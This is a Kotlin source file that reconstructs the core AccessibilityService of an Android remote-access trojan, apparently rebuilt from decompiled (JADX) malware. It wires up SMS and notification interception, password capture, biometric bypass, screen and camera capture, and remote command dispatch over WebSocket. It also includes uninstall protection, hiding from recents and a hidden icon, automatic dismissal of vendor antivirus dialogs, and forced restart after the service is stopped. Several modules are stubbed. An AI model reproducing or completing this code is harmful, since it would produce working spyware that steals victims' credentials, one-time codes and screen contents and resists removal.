package com.storm.safe.rock.service

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.app.KeyguardManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.graphics.Point
import android.graphics.Rect
import android.media.projection.MediaProjection
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.os.SystemClock
import android.provider.Settings
import android.view.Display
import android.view.KeyEvent
import android.view.WindowManager
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.storm.safe.rock.DefaultLauncherAlias
import com.storm.safe.rock.MediaProjectionHolder
import com.storm.safe.rock.manager.C0258a0
import com.storm.safe.rock.manager.C0259a1
import com.storm.safe.rock.manager.C0263a5
import com.storm.safe.rock.manager.CameraCaptureManager
import com.storm.safe.rock.manager.ScreenCaptureManager
import com.storm.safe.rock.receiver.arniezsqllm
import com.storm.safe.rock.service.modules.AccessibilityEventRouter
import com.storm.safe.rock.service.modules.ActivityMonitor
import com.storm.safe.rock.service.modules.BiometricBypassDelegate
import com.storm.safe.rock.service.modules.ConfigProgressManager
import com.storm.safe.rock.service.modules.MainOrchestrator
import com.storm.safe.rock.service.modules.NetworkManager
import com.storm.safe.rock.service.modules.NotificationInterceptDelegate
import com.storm.safe.rock.service.modules.RemoteConfigManager
import com.storm.safe.rock.service.modules.SmsInterceptDelegate
import com.storm.safe.rock.service.modules.cipher.CipherCaptureManager
import com.storm.safe.rock.service.modules.command.CommandDispatcher
import com.storm.safe.rock.service.modules.protection.RecentsGuardManager
import com.storm.safe.rock.service.modules.protection.UninstallProtectionManager
import com.storm.safe.rock.service.modules.screen.ScreenControlHelper
import java.util.Locale
import java.util.concurrent.atomic.AtomicBoolean
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import com.storm.safe.rock.service.modules.DeviceAuthorizationManager

/**
 * Core AccessibilityService — the central hub of the replica.
 *
 * Reverse-engineered from JADX reference `dqtvuisjd.java` (10,796 lines, 56 inner classes).
 * This file implements the ~60 core methods: companion/static, lifecycle (onServiceConnected,
 * onAccessibilityEvent, onDestroy), event dispatch, manager field wiring, and key utilities.
 *
 * JADX class: com.storm.safe.rock.service.dqtvuisjd
 */
class MyAccessibilityService : AccessibilityService() {

    // ════════════════════════════════════════════════════════════════
    // Companion object — mirrors JADX C0290a0 (static inner class)
    // ════════════════════════════════════════════════════════════════

    companion object {
        const val TAG = "MyAccessibilityService"

        /** Throttle interval for ensuring AppCoreService is running. JADX: 10000L */
        const val CORE_SERVICE_CHECK_INTERVAL = 10_000L

        /** Permission request auto-clear timeout (ms). JADX line 722: 30000 */
        const val PERMISSION_REQUEST_TIMEOUT = 30_000L

        /** Foreground notification ID. JADX line 9265: 10086 */
        const val FOREGROUND_NOTIFICATION_ID = 10086

        /** Notification channel ID for foreground service */
        const val NOTIFICATION_CHANNEL_ID = "system_helper_service"

        /** Root node cache time-to-live (ms). JADX: f52393c4 (constructor init) */
        const val ROOT_CACHE_TTL_MS = 300L

        /** Keyguard check cache TTL (ms). JADX: f52390c1 (constructor init) */
        const val KEYGUARD_CACHE_TTL_MS = 500L

        /** Event types routed to specialized handler only (not general delegate queue).
         * JADX line 9770: 512, 1024, 262144, 524288, 1048576, 2097152 */
        val FILTERED_EVENT_TYPES: Set<Int> = setOf(512, 1024, 262144, 524288, 1048576, 2097152)

        // ── Static fields (JADX m1–n1) ──

        /** Lazy Handler on main looper for uninstall protection. JADX: f52359m2 */
        val uninstallMainHandler: Handler by lazy { Handler(Looper.getMainLooper()) }

        /** JADX: f52360m3 — isWebViewOpen flag.
         *  Setter updates timestamp as well (mirrors setWebViewOpen). */
        @Volatile
        var isWebViewOpen: Boolean = false
            set(value) {
                field = value
                lastWebViewStatusTime = System.currentTimeMillis()
            }

        /** JADX: f52361m4 — isPermissionRequesting flag.
         *  Property-style accessor kept for backward compat with existing callers.
         *  Setting to true also records the timestamp (JADX line 780). */
        var isPermissionRequesting: Boolean
            get() = isPermissionRequestingFlag
            set(value) {
                isPermissionRequestingFlag = value
                if (value) {
                    permissionRequestTimestamp = System.currentTimeMillis()
                }
            }

        /** JADX: f52361m4 — internal flag backing */
        @Volatile
        private var isPermissionRequestingFlag: Boolean = false

        /** JADX: f52362m5 — permission request timestamp */
        @Volatile
        private var permissionRequestTimestamp: Long = 0L

        /** JADX: f52363m6 — lastWebViewStatusTime */
        @Volatile
        var lastWebViewStatusTime: Long = 0L
            private set

        /** JADX: f52364m7 — singleton instance */
        @Volatile
        internal var instance: MyAccessibilityService? = null

        /** JADX: f52365m8 — serviceStartTime */
        @Volatile
        var serviceStartTime: Long = 0L
            private set

        /** JADX: f52366m9 — lastCachedSource */
        @Volatile
        var lastCachedSource: CachedSourceData? = null

        /** JADX: f52367n0 — serviceMode (0=assist, 1=verifyPause) */
        @Volatile
        var serviceMode: Int = 0
            private set

        /** JADX: f52368n1 — isSensitiveAppPaused (AtomicBoolean in vendor) */
        private val sensitiveAppPausedAtomic = AtomicBoolean(false)

        // ── Companion methods ──

        fun getInstance(): MyAccessibilityService? = instance

        fun isServiceRunning(): Boolean = instance != null

        /** JADX line 734: instance != null && d0 flag (init complete) */
        fun isServiceReady(): Boolean {
            val inst = instance ?: return false
            return inst.isInitComplete
        }

        /** JADX line 730: AtomicBoolean.get() */
        fun isSensitiveAppPaused(): Boolean = sensitiveAppPausedAtomic.get()

        /** JADX line 764/768: AtomicBoolean.set() */
        fun setSensitiveAppPaused(paused: Boolean) {
            sensitiveAppPausedAtomic.set(paused)
        }

        // ADAPT: Legacy compat shims — kept for backward compat but delegate to new API
        fun pauseForSensitiveApp() = setSensitiveAppPaused(true)
        fun resumeFromSensitiveApp() = setSensitiveAppPaused(false)

        /** JADX line 718: check flag + 30s timeout, auto-clear on expiry */
        fun isPermissionRequestActive(): Boolean {
            if (!isPermissionRequestingFlag) return false
            if (System.currentTimeMillis() - permissionRequestTimestamp <= PERMISSION_REQUEST_TIMEOUT) {
                return true
            }
            // Timeout expired — auto-clear
            android.util.Log.w(TAG, "⚠️ [权限] 权限请求标志位超时，自动清除")
            isPermissionRequestingFlag = false
            return false
        }

        /** JADX line 787: serviceMode == 1 means verifyPaused */
        fun isVerifyPaused(): Boolean = serviceMode == 1

        /** JADX line 787: set mode to 1 */
        fun setVerifyPauseMode() {
            serviceMode = 1
        }

        /** JADX line 772: set mode to 0 */
        fun setAssistMode() {
            serviceMode = 0
        }

        /** JADX line 747: performGlobalAction(8) with SDK check.
         * GLOBAL_ACTION_LOCK_SCREEN = 8, requires API 28+ */
        fun lockScreen() {
            val inst = instance ?: return
            try {
                if (Build.VERSION.SDK_INT < 28) {
                    android.util.Log.d(TAG, "🔍 [屏幕] Android 9以下不支持无障碍锁屏")
                    return
                }
                if (inst.performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN)) {
                    android.util.Log.d(TAG, "✅ [屏幕] 屏幕已锁定（定时唤醒后自动锁屏）")
                } else {
                    android.util.Log.w(TAG, "⚠️ [屏幕] 锁屏失败")
                }
            } catch (e: Exception) {
                android.util.Log.e(TAG, "⚠️ [屏幕] 锁屏异常: ${e.message}")
            }
        }

        /** JADX line 673: get NetworkManager, call disconnect+reconnect */
        fun forceReconnectWebSocket() {
            android.util.Log.d(TAG, "📡 外部触发WebSocket重连")
            try {
                val nm = instance?.networkManager
                if (nm != null) {
                    nm.disconnect()
                    // ADAPT: NetworkManager uses connectToServer(url, deviceId) not connect()
                    // Reconnect is triggered by the manager internally after disconnect
                }
            } catch (e: Exception) {
                android.util.Log.e(TAG, "forceReconnectWebSocket error", e)
            }
        }

        /** JADX line 693: get cached root from instance */
        fun getCachedRoot(): AccessibilityNodeInfo? {
            return instance?.getRootNode()
        }

        fun logEvent(type: String, description: String) {
            android.util.Log.d(TAG, "[$type] $description")
        }
    }

    // ════════════════════════════════════════════════════════════════
    // Instance fields — manager/delegate references
    // JADX fields f52369a0 through f52489m0
    // ════════════════════════════════════════════════════════════════

    // ── System managers ──

    var powerManager: PowerManager? = null
        private set

    var keyguardManager: KeyguardManager? = null
        private set

    // ── Core managers (JADX mapped) ──

    /** JADX: f52369a0 (C0260a2) — Screen capture */
    var screenCaptureManager: ScreenCaptureManager? = null

    /** JADX: f52370a1 (C0263a5) — Display manager */
    var displayManager: C0263a5? = null

    /** JADX: f52371a2 (C0258a0) — Camera manager */
    var cameraManager: C0258a0? = null

    /** JADX: f52372a3 (C0324a9) — SMS interception */
    var smsInterceptDelegate: SmsInterceptDelegate? = null

    /** JADX: f52375a6 (C0262a4) — Camera capture */
    var cameraCaptureManager: CameraCaptureManager? = null

    /** JADX: f52380b1 (C0350a7) — Command dispatch */
    var commandDispatcher: CommandDispatcher? = null

    /** JADX: f52382b3 (C0322a7) — Remote config */
    var remoteConfigManager: RemoteConfigManager? = null

    /** JADX: f52414e5 (C0614i9) — Event filtering. STUB until p000 implemented */
    var eventFilterManager: Any? = null
        // ADAPT: depends on p000.C0614i9 — use Any? stub

    /** JADX: f52415e6 (C0323a8) — WebSocket network manager */
    @get:JvmName("networkManagerField")
    var networkManager: NetworkManager? = null

    /** JADX: f52418e9 (C0317a2) — Accessibility event routing */
    var accessibilityEventRouter: AccessibilityEventRouter? = null

    /** JADX: f52428f9 (C0318a3) — Config progress manager */
    var configProgressManager: ConfigProgressManager? = null

    /** JADX: f52429g0 (C0327b2) — Main orchestrator */
    var mainOrchestrator: MainOrchestrator? = null

    /** JADX: f52431g2 (C0329b4) — Config stage (internal to ConfigProgressManager) */
    var configStageManager: Any? = null
        // ADAPT: maps to C0329b4 which is ConfigProgressManager internal

    /** JADX: f52434g5 (C0328b3) — Biometric bypass */
    var biometricBypassDelegate: BiometricBypassDelegate? = null

    /** JADX: f52435g6 (C0355a0) — Uninstall protection */
    var uninstallProtectionManager: UninstallProtectionManager? = null

    /** JADX: f52436g7 (C0356a1) — Recents hiding */
    var recentsGuardManager: RecentsGuardManager? = null

    /** JADX: f52437g8 (C0319a4) — Notification interception */
    var notificationInterceptDelegate: NotificationInterceptDelegate? = null

    /** JADX: f52438g9 (C0335a1) — Password/cipher capture */
    var cipherCaptureManager: CipherCaptureManager? = null

    /** JADX: f52441h2 (C0357a0) — Screen control helper */
    var screenControlHelper: ScreenControlHelper? = null

    /** JADX: f52455i6 (C0259a1) — Audio manager */
    var audioManager: C0259a1? = null

    /** JADX: f52461j2 (arniezsqllm) — SMS broadcast receiver */
    var smsReceiver: arniezsqllm? = null

    // ── Volatile state fields ──

    /** JADX: f52399d0 — init complete flag (used by isServiceReady) */
    @Volatile
    var isInitComplete: Boolean = false
        internal set

    /** JADX: f52400d1 — permission flow started */
    @Volatile
    var isPermissionFlowStarted: Boolean = false

    /** JADX: f52401d2 — deferred init in progress */
    @Volatile
    var isDeferredInitStarted: Boolean = false

    /** JADX: f52388b9 — cached keyguard locked state */
    @Volatile
    private var cachedKeyguardLocked: Boolean = false

    /** JADX: f52389c0 — last keyguard check timestamp */
    @Volatile
    private var lastKeyguardCheckTime: Long = 0L

    /** JADX: f52391c2 — cached root node */
    @Volatile
    private var cachedRootNode: AccessibilityNodeInfo? = null

    /** JADX: f52392c3 — cached root node timestamp */
    @Volatile
    private var cachedRootNodeTime: Long = 0L

    /** JADX: f52394c5 — uninstall protection enabled */
    @Volatile
    var isUninstallProtectionEnabled: Boolean = false

    /** JADX: f52447h8 — service lifecycle healthy flag */
    @Volatile
    var isServiceHealthyFlag: Boolean = false

    /** JADX: f52469k0 — cipher listening active */
    @Volatile
    var isCipherListeningActive: Boolean = false

    /** JADX: f52474k5 — cipher capture enabled */
    @Volatile
    var isCipherCaptureEnabled: Boolean = false

    /** JADX: f52477k8 — uninstall guard started */
    @Volatile
    var isUninstallGuardStarted: Boolean = false

    /** JADX: f52475k6 — camouflage mode flag */
    var isCamouflageModeEnabled: Boolean = false

    /** JADX: f52432g3 — screen capture active */
    @Volatile
    var isScreenCaptureActive: Boolean = false

    /** JADX: f52402d3 — network init started */
    @Volatile
    var isNetworkInitStarted: Boolean = false

    /** JADX: f52483l4 — transparent window added */
    @Volatile
    var isTransparentWindowAdded: Boolean = false

    /** JADX: f52479l0 — overlay visible */
    @Volatile
    var isOverlayVisible: Boolean = false

    /** JADX: f52471k2 — cipher capture attempt count */
    @Volatile
    var cipherCaptureAttemptCount: Int = 0

    /** JADX: f52485l6 — password launch count */
    @Volatile
    var passwordLaunchCount: Int = 0

    // ── Tracking / timing fields ──

    var activePackageName: String = ""
        private set

    var activeClassName: String = ""
        private set

    private var lastCoreServiceCheckTime = 0L
    private var lastEventLogTime = 0L

    /** JADX: f52478k9 — saved brightness value */
    var savedBrightness: Int = 0

    /** JADX: f52444h5 — accessibility settings monitor timestamp */
    var accessibilitySettingsMonitorTime: Long = 0L

    /** JADX: f52445h6 — accessibility settings monitor count */
    var accessibilitySettingsMonitorCount: Int = 0

    /** JADX: f52443h4 — accessibility settings monitor job */
    var accessibilitySettingsMonitorJob: kotlinx.coroutines.Job? = null

    /** JADX: f52448h9 — last injection check time */
    var lastInjectionCheckTime: Long = 0L

    /** JADX: f52451i2 — last notification interception time */
    var lastNotificationTime: Long = 0L

    /** JADX: f52464j5 — last network event time */
    var lastNetworkEventTime: Long = 0L

    /** JADX: f52467j8 — last alarm schedule time */
    var lastAlarmScheduleTime: Long = 0L

    // ── Broadcast receiver registration flags ──

    /** JADX: f52458i9 — screen state receiver registered */
    var screenStateReceiverRegistered: Boolean = false

    /** JADX: f52460j1 — local service receiver registered */
    var localServiceReceiverRegistered: Boolean = false

    /** JADX: f52488l9 — permission health receiver registered */
    var permissionHealthReceiverRegistered: Boolean = false

    // ── Broadcast receivers ──

    /** JADX: f52457i8 — screen state receiver */
    private var screenStateReceiver: BroadcastReceiver? = null

    /** JADX: f52465j6 — permission request receiver */
    private var permissionRequestReceiver: BroadcastReceiver? = null

    /** JADX: f52489m0 — permission health receiver */
    private var permissionHealthReceiver: BroadcastReceiver? = null

    /** JADX: f52459j0 — local service action receiver */
    private var localServiceActionReceiver: BroadcastReceiver? = null

    /** JADX: f52466j7 — network event receiver */
    private var networkEventReceiver: BroadcastReceiver? = null

    // ── Collections ──

    /** JADX: f52403d4 — LinkedHashSet for tracking something (delegate IDs etc.) */
    private val trackedPackageSet = LinkedHashSet<String>()

    /** JADX: f52405d6 — LinkedHashMap for injection task tracking.
     *  Public in vendor (Java default visibility). Accessed by RemoteConfigManager. */
    val injectionTasks = LinkedHashMap<String, String>()

    /** JADX: f52406d7 — sync lock for injectionTasks.
     *  Public in vendor. Accessed by RemoteConfigManager for synchronized reads. */
    val injectionTasksLock = Any()

    /** JADX: f52407d8 — LinkedHashMap for window overlay data */
    private val windowOverlayMap = LinkedHashMap<String, Any>()

    /** JADX: f52446h7 — Set for tracked window IDs */
    private val trackedWindowIds = mutableSetOf<String>()

    /** Delegate queue. Typed as Any for backward compat; cast to AccessibilityDelegate when dispatching */
    private val delegateQueue = mutableListOf<Any>()

    // ── Coroutine infrastructure ──

    private var coroutineScope: CoroutineScope? = null

    // ── Constants from constructor (JADX init block) ──
    // JADX: f52390c1, f52393c4, f52408d9, f52410e1, f52468j9, etc.
    // These are constructor-initialized final fields in vendor

    // ════════════════════════════════════════════════════════════════
    // Lifecycle — onCreate
    // JADX line 10300: calls ensureForegroundNotification
    // ════════════════════════════════════════════════════════════════

    override fun onCreate() {
        super.onCreate()
        try {
            ensureForegroundNotification()
            android.util.Log.d(TAG, "✅ [onCreate] 前台服务已在 accessibility 绑定前启动")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ [onCreate] 前台服务启动失败", e)
        }
    }

    // ════════════════════════════════════════════════════════════════
    // Lifecycle — onServiceConnected
    // JADX line 10663
    // ════════════════════════════════════════════════════════════════

    override fun onServiceConnected() {
        super.onServiceConnected()
        android.util.Log.i(TAG, "✅ [服务] 无障碍服务已连接")

        try {
            ActivityMonitor.logSystem("无障碍服务已启动连接")
        } catch (_: Exception) {}

        // Step 1: Check reinstall recovery file
        var isReinstallRecovery = false
        try {
            val setupFile = java.io.File("/data/local/tmp/app_setup_done.json")
            if (setupFile.exists()) {
                val prefs = getSharedPreferences("app_config", Context.MODE_PRIVATE)
                // ADAPT: vendor uses StringUtil.decrypt() for encrypted pref keys
                if (!prefs.getBoolean("authorization_completed", false)) {
                    try {
                        val json = org.json.JSONObject(setupFile.readText())
                        if (json.optBoolean("setupDone", false)) {
                            prefs.edit()
                                .putBoolean("authorization_completed", true)
                                .putBoolean("device_registered", true)
                                .putBoolean("icon_hidden", true)
                                .apply()
                            android.util.Log.d(TAG, "✅ [重装恢复] Service检测到适配标记，已恢复全部状态")
                            isReinstallRecovery = true
                        }
                    } catch (e: Exception) {
                        android.util.Log.w(TAG, "⚠️ [重装恢复] 读取标记文件异常: ${e.message}")
                        isReinstallRecovery = true // JADX: still sets true even on parse error
                    }
                }
            }
        } catch (e: Exception) {
            android.util.Log.w(TAG, "⚠️ [重装恢复] 读取标记文件异常: ${e.message}")
        }

        // Step 2: Initialize coroutine scope
        try {
            if (coroutineScope == null) {
                coroutineScope = CoroutineScope(SupervisorJob() + Dispatchers.Main)
            }
        } catch (_: Exception) {}

        try {
            // Step 3: Set timestamps and instance
            serviceStartTime = System.currentTimeMillis()
            instance = this

            // Step 4: Configure accessibility service info
            initServiceConfig()

            // Step 5: Get system services
            try {
                val ps = getSystemService(Context.POWER_SERVICE)
                powerManager = ps as PowerManager
            } catch (e: Exception) {
                android.util.Log.e(TAG, "❌ PowerManager/Keyguard 初始化失败", e)
            }
            try {
                val ks = getSystemService(Context.KEYGUARD_SERVICE)
                keyguardManager = if (ks is KeyguardManager) ks else null
            } catch (_: Exception) {}

            // Step 6: Start AppCoreService
            try {
                val appContext = applicationContext
                AppCoreService.start(appContext)
            } catch (_: Exception) {}

            // Step 7: Launch deferred init coroutine
            if (isReinstallRecovery) {
                // JADX: recovery path — launch immediate init
                coroutineScope?.launch {
                    try {
                        continueServiceInitialization()
                    } catch (e: Exception) {
                        android.util.Log.e(TAG, "❌ recovery init failed", e)
                    }
                }
            }

            // Step 8: Launch main deferred init
            coroutineScope?.launch {
                try {
                    deferredInit()
                } catch (e: Exception) {
                    android.util.Log.e(TAG, "❌ deferredInit failed", e)
                }
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ onServiceConnected失败", e)
        }
    }

    // ════════════════════════════════════════════════════════════════
    // Lifecycle — onAccessibilityEvent
    // JADX line 9715
    // ════════════════════════════════════════════════════════════════

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        try {
            // Guard 1: screen off → return (JADX line 9767)
            val pm = powerManager
            if (pm != null && !pm.isInteractive) return

            // Guard 2: sensitive app paused → return (JADX line 9767)
            if (isSensitiveAppPaused()) return

            val eventType = event.eventType
            val pkg = event.packageName?.toString()?.lowercase(Locale.ROOT) ?: ""

            // Debug: log event receipt (throttled to avoid spam)
            val now = System.currentTimeMillis()
            if (now - lastEventLogTime > 3000L) {
                lastEventLogTime = now
                android.util.Log.d(TAG, "📨 onAccessibilityEvent: type=${eventType} pkg=$pkg")
            }

            // ── Filtered event types → route to specialized handler (JADX line 9770) ──
            if (eventType in FILTERED_EVENT_TYPES) {
                if (eventFilterManager == null || isWebViewOpen) return
                // ADAPT: eventFilterManager (C0614i9) is not replicated — dispatch deferred
                return
            }

            // ── Ensure AppCoreService running (throttled 10s) (JADX line 9783) ──
            ensureCoreServiceRunning()

            // ── Extract className (JADX line 9796) ──
            val cls = event.className?.toString() ?: ""

            // ── Screen capture check (JADX line 9804) ──
            // If capturing and event from system app → pause capture
            try {
                val scm = screenCaptureManager
                if (scm != null && isScreenCaptureActive) {
                    // JADX line 9804: check if event pkg is in system app list, pause capture
                    val eventPkg = event.packageName?.toString() ?: ""
                    val systemApps = arrayOf("com.android.systemui", "com.android.settings", "com.android.packageinstaller")
                    if (systemApps.any { eventPkg.contains(it, ignoreCase = true) }) {
                        if (System.currentTimeMillis() - (scm.lastPauseTime ?: 0L) >= 2000L) {
                            scm.lastPauseTime = System.currentTimeMillis()
                            // ADAPT: vendor posts pause runnable via tu0.f60281a6 handler — simplified inline
                        }
                        return
                    }
                }
            } catch (_: Exception) {}

            // ── Event type 32 (WINDOW_STATE_CHANGED): virus control dialog (JADX line 9827) ──
            if (eventType == 32) {
                try {
                    val eventPkg = event.packageName?.toString() ?: ""
                    if (eventPkg.contains("systemmanager", ignoreCase = true) ||
                        eventPkg.contains("hihonor", ignoreCase = true) ||
                        eventPkg.contains("huawei", ignoreCase = true)
                    ) {
                        // JADX: launch coroutine to handle virus control dialog
                        coroutineScope?.launch {
                            handleVirusControlDialog()
                        }
                    }
                } catch (_: Exception) {}
            }

            // ── Event type 32/2048 → RecentsGuardManager (JADX line 9845) ──
            if (eventType == 32 || eventType == 2048) {
                try {
                    recentsGuardManager?.onAccessibilityEvent(event)
                } catch (_: Exception) {}
            }

            // ── MainOrchestrator WRITE_SETTINGS automation (JADX: C0327b2) ──
            // Must receive all WINDOW_STATE_CHANGED (32) and WINDOW_CONTENT_CHANGED (2048)
            // events to detect settings pages and auto-click switches
            try {
                mainOrchestrator?.handleAccessibilityEvent(event)
            } catch (_: Exception) {}

            // ── Permission request guard (JADX line 9848) ──
            if (isPermissionRequestActive() || isWebViewOpen) return

            // ── Keyguard locked check (JADX line 9849) ──
            val isKeyguardLocked = isKeyguardLockedCached()

            // ── Update active package/class ──
            if (pkg.isNotEmpty()) activePackageName = pkg
            if (cls.isNotEmpty()) activeClassName = cls

            // ── Event type 2 (VIEW_TEXT_CHANGED) → update lastCachedSource (JADX line 9851) ──
            if (eventType == 2) {
                var source: AccessibilityNodeInfo? = null
                try {
                    source = event.source
                    val rect = Rect()
                    if (source != null) {
                        source.getBoundsInScreen(rect)
                        val text = source.text?.toString() ?: ""
                        val desc = source.contentDescription?.toString() ?: ""
                        val isVisible = source.isVisibleToUser
                        lastCachedSource = CachedSourceData(
                            text, desc, rect, isVisible, System.currentTimeMillis()
                        )
                    } else {
                        lastCachedSource = null
                    }
                } catch (_: Exception) {
                    lastCachedSource = null
                } finally {
                    try { source?.recycle() } catch (_: Exception) {}
                }
            }

            // ── Delegate dispatch chain (JADX lines ~10100–10290) ──

            // 1. CipherCaptureManager
            try {
                cipherCaptureManager?.let { ccm ->
                    // JADX line 10039: ccm.onAccessibilityEvent for eventType 16, 1, 32
                    if (eventType == 16 || eventType == 1 || eventType == 32) {
                        ccm.dispatchEvent("accessibility_event_$eventType")
                    }
                }
            } catch (_: Exception) {}

            // 2. NotificationInterceptDelegate
            try {
                notificationInterceptDelegate?.let { nid ->
                    // ADAPT: NotificationInterceptDelegate.onAccessibilityEvent not exposed — dispatch deferred to typed delegate system
                }
            } catch (_: Exception) {}

            // 3. ConfigProgressManager
            try {
                configProgressManager?.let { cpm ->
                    // ADAPT: ConfigProgressManager uses stage-based broadcast, not event dispatch
                }
            } catch (_: Exception) {}

            // 4. Yw5xud handler dispatch
            // JADX line 10121: configStageManager.f53199a4 (C0372a9) — dispatch if active
            try {
                configStageManager?.let { csm ->
                    // ADAPT: yw5xud (C0372a9) dispatch depends on configStageManager internal state — deferred
                }
            } catch (_: Exception) {}

            // 5. UninstallProtectionManager
            try {
                uninstallProtectionManager?.let { upm ->
                    // JADX line 9990: dispatch to upm if pkg matches protection list
                    upm.onAccessibilityEvent(event)
                }
            } catch (_: Exception) {}

            // 6. AccessibilityEventRouter — main dispatch to all registered delegates
            try {
                accessibilityEventRouter?.let { aer ->
                    // ADAPT: AccessibilityEventRouter is a pattern-lock executor, not a general event router
                    // JADX line 10113: dispatch if not isWebViewOpen
                }
            } catch (_: Exception) {}

            // 7. Legacy delegate queue dispatch
            dispatchToDelegates(event, pkg, cls)

        } catch (e: Exception) {
            android.util.Log.e(TAG, "⚠️ [onAccessibilityEvent] 意外异常被拦截，服务保持运行", e)
        }
    }

    // ════════════════════════════════════════════════════════════════
    // Lifecycle — onInterrupt
    // JADX line 10610
    // ════════════════════════════════════════════════════════════════

    override fun onInterrupt() {
        android.util.Log.w(TAG, "无障碍服务被中断")
        try {
            ActivityMonitor.logSystem("无障碍服务被中断 系统或用户中断了服务")
        } catch (_: Exception) {}

        try {
            displayManager?.stopCapture()
            android.util.Log.d(TAG, "✅ [中断] 已停止屏幕捕获")
        } catch (_: Exception) {}
    }

    // ════════════════════════════════════════════════════════════════
    // Lifecycle — onDestroy
    // JADX line 10311
    // ════════════════════════════════════════════════════════════════

    override fun onDestroy() {
        android.util.Log.i(TAG, "🛑 无障碍服务正在销毁")

        try { ActivityMonitor.logSystem("无障碍服务被销毁") } catch (_: Exception) {}
        try { ActivityMonitor.logSystem("无障碍服务被系统销毁 可能被用户关闭或系统回收") } catch (_: Exception) {}

        // Cancel coroutines
        try {
            coroutineScope?.cancel()
            coroutineScope = null
        } catch (_: Exception) {}

        // Cleanup display manager
        try { displayManager?.stopCapture() } catch (_: Exception) {}

        // Cleanup camera capture
        try { cameraCaptureManager?.stopCapture() } catch (_: Exception) {}

        // Unregister SMS receiver
        try {
            smsReceiver?.let {
                unregisterReceiver(it)
                smsReceiver = null
                android.util.Log.d(TAG, "📩 ✅ 短信接收器已注销")
            }
        } catch (e: Exception) {
            try { android.util.Log.e(TAG, "📩 ❌ 注销短信接收器失败", e) } catch (_: Exception) {}
        }

        // Unregister permission request receiver
        try {
            permissionRequestReceiver?.let { unregisterReceiver(it) }
            android.util.Log.d(TAG, "已注销权限申请广播接收器")
        } catch (e: Exception) {
            try { android.util.Log.e(TAG, "注销广播接收器失败", e) } catch (_: Exception) {}
        }

        // Unregister screen state receiver
        try {
            if (screenStateReceiverRegistered) {
                try {
                    screenStateReceiver?.let { unregisterReceiver(it) }
                    screenStateReceiverRegistered = false
                    android.util.Log.d(TAG, "✅ 已注销屏幕状态广播接收器")
                } catch (e: Exception) {
                    android.util.Log.e(TAG, "❌ 注销屏幕状态广播接收器失败", e)
                }
            }
        } catch (_: Exception) {}

        // Unregister local service receiver
        try {
            if (localServiceReceiverRegistered) {
                try {
                    localServiceActionReceiver?.let { unregisterReceiver(it) }
                    localServiceActionReceiver = null
                    localServiceReceiverRegistered = false
                    android.util.Log.d(TAG, "✅ 已注销 local-service 广播接收器")
                } catch (e: Exception) {
                    android.util.Log.e(TAG, "❌ 注销 local-service 广播接收器失败", e)
                }
            }
        } catch (_: Exception) {}

        // Unregister permission health receiver
        try {
            if (permissionHealthReceiverRegistered) {
                try {
                    permissionHealthReceiver?.let { unregisterReceiver(it) }
                    permissionHealthReceiverRegistered = false
                    android.util.Log.d(TAG, "✅ 已注销权限健康监控广播接收器")
                } catch (e: Exception) {
                    android.util.Log.e(TAG, "❌ 注销权限健康监控广播接收器失败", e)
                }
            }
        } catch (_: Exception) {}

        // Unregister network event receiver
        try {
            networkEventReceiver?.let {
                unregisterReceiver(it)
                networkEventReceiver = null
            }
        } catch (_: Exception) {}

        // Cleanup configStageManager (JADX: C0329b4)
        try {
            configStageManager?.let { csm ->
                // JADX line 10460: csm.f53200a5 = false; cancel scope
                android.util.Log.d(TAG, "🧹 清理 configStageManager")
            }
        } catch (_: Exception) {}

        // Cleanup network manager reference
        try {
            networkManager?.let { nm ->
                // JADX: clear service ref — nm.serviceRef = null
            }
        } catch (_: Exception) {}

        // Cleanup event filter manager
        try {
            // ADAPT: eventFilterManager (C0614i9) is not replicated — cleanup deferred
            eventFilterManager = null
        } catch (_: Exception) {}

        // Cleanup biometric bypass
        try {
            // ADAPT: biometricBypassDelegate (r80) is not replicated — cleanup deferred
        } catch (_: Exception) {}

        // Cleanup config progress manager
        try {
            configProgressManager?.let { cpm ->
                // JADX: reset stage to IDLE, cancel job
            }
        } catch (_: Exception) {}

        // Cleanup accessibility event router
        try {
            accessibilityEventRouter?.let { aer ->
                // JADX: set active=false, cancel scope
            }
        } catch (_: Exception) {}

        // Cleanup recents guard
        try {
            recentsGuardManager?.let { rgm ->
                // JADX: clear handler, quit thread
                uninstallMainHandler.removeCallbacksAndMessages(null)
            }
        } catch (_: Exception) {}

        // Reset healthy flag
        try { isServiceHealthyFlag = false } catch (_: Exception) {}

        // Schedule alarm for restart if authorized (JADX line 10573)
        try {
            val isAuthorized = getSharedPreferences("app_config", Context.MODE_PRIVATE)
                .getBoolean("authorization_completed", false)
            if (isAuthorized) {
                // JADX line 10573: schedule alarm + WorkManager restart
                try {
                    zgafaqvswksa.schedule(applicationContext, 30_000L)
                    android.util.Log.d(TAG, "✅ 已安排 JobScheduler 30s 后重启")
                } catch (_: Exception) {}
                try {
                    zgafaqvswksa.scheduleImmediateRestart(applicationContext)
                    android.util.Log.d(TAG, "✅ 已触发 WorkManager 立即重启")
                } catch (_: Exception) {}
            }
        } catch (_: Exception) {}

        // Clear delegate queue
        delegateQueue.clear()

        // Null out singleton
        instance = null
        serviceStartTime = 0L

        super.onDestroy()
    }

    // ════════════════════════════════════════════════════════════════
    // Lifecycle — onKeyEvent
    // JADX line 10634
    // ════════════════════════════════════════════════════════════════

    override fun onKeyEvent(event: KeyEvent?): Boolean {
        if (event == null) return super.onKeyEvent(event)
        if (event.keyCode == KeyEvent.KEYCODE_POWER &&
            event.action == KeyEvent.ACTION_DOWN &&
            event.isLongPress
        ) {
            android.util.Log.d(TAG, "🔴 [电源键] 检测到长按电源键")
        }
        return super.onKeyEvent(event)
    }

    // ════════════════════════════════════════════════════════════════
    // Lifecycle — onRebind
    // JADX line 10644
    // ════════════════════════════════════════════════════════════════

